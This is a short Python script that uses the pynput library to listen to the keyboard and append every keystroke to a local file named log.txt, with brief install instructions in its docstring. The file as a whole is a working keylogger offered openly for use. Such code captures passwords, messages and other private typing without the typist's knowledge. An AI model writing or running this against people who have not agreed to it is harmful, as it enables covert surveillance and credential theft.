"""
install pynput library using this command: pip install pynput
to know more about pynput visit: https://pypi.org/project/pynput/
"""
from pynput.keyboard import Listener

def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.shift":
        key = ''
    key+='\n'

    with open("log.txt", 'a') as f:
        f.write(key)

with Listener(on_press=log_keystroke) as l:
    l.join()
